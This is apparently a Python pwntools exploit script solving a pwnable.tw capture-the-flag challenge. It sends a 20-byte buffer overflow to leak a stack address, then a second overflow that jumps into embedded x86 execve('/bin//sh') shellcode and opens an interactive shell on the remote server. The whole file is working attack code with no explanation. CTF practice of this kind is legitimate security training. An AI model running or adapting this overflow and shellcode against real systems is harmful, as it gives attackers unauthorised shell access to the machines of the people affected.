from pwn import *

# The vulnerable server.
server = remote("chall.pwnable.tw", 10000)

addr_1 = p32(0x08048087)

sc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"

def leak():
    payload = "a" * 20 + addr_1
    
    recv = server.recvuntil(':')

    server.send(payload)

    stack_addr = server.recv(4)

    print "Address of stack: " + hex(u32(stack_addr))
    
    return u32(stack_addr)

def pwn(addr):

    payload = 'a' * 20 + p32(addr+20) + sc

    server.send(payload)

stack_addr = leak()
pwn(stack_addr)

server.interactive()
